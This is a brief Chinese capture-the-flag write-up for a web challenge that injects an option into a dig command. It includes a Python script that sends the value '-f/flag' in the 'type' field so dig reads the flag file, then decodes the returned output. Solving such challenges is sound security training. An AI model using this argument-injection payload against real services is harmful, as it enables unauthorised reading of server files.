## web签到
命令注入
考点是`-f`后可以不用空格直接接文件
```python
import base64  
import json  
  
import requests  
  
url = "http://web0.aliyunctf.com:47340/digHandler"  
headers = {"Content-Type": "application/json; charset=UTF-8"}  
data = {  
    "domain": "baidu.com",  
    "type": "-f/flag"  
    }  
  
res = requests.post(url, headers=headers, data=json.dumps(data))  
  
dig_res = json.loads(res.text).get("data")  
dig_res = base64.b64decode(dig_res).decode()  
print(dig_res)
```